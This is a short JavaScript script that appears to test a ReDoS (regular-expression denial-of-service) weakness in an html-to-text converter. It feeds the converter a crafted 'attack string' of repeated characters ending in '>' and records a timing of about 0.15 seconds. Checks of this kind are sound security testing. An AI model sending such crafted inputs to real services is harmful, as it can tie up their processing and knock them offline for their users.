const htmlToText = require("./jsHtmlToText.js");

//Attack String :""+"aaaaaaa"*100000+">"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "aaaaaaa";
}
str += ">";

var result = htmlToText(str, "");

// real    0m0.153s
// user    0m0.116s
// sys     0m0.011s
